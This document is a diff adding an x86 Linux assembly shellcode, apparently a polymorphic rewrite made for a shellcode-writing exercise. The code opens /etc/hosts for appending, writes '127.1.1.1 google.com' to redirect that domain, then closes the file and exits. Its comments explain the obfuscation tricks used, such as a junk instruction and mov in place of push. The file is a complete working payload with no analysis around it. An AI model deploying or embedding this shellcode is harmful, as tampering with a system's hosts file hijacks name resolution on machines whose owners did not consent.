@@ -1,0 +1,49 @@
+global _start
+section .text
+
+_start:
+    and edx,edx     ; junk instruction with no effect
+    xor ecx, ecx
+    mul ecx
+    mov al, 0x5     
+    push ecx
+
+    ;push 0x7374736f     ;/etc///hosts
+    ;push 0x682f2f2f
+    ;push 0x6374652f
+    
+    mov dword [esp-4],0x7374736f ; instead of pushing
+    mov dword [esp-8],0x682f2f2f ; /etc///hosts
+    mov dword [esp-12],0x6374652f ; is moved into esp
+    sub esp,0xc
+
+    mov ebx, esp
+    mov cx, 0x401      
+    int 0x80        
+
+    xchg eax, ebx
+    push 0x4
+    pop eax
+    jmp short _load_data    
+
+_write:
+    pop ecx
+    ;push 20         
+    ;pop edx
+    mov dl,0x14     ; identifier (20) for write syscall is moved to dl
+    int 0x80        
+
+    ;push 0x6
+    ;pop eax
+    mov al,0x6      ; identifier (6) for close syscall is moved to al
+    int 0x80       
+
+    ;push 0x1
+    ;pop eax
+    mov al,0x1
+    int 0x80       ; identifier (1) for exit syscall is moved to al   
+
+_load_data:
+    call _write
+    google db "127.1.1.1 google.com"
+    
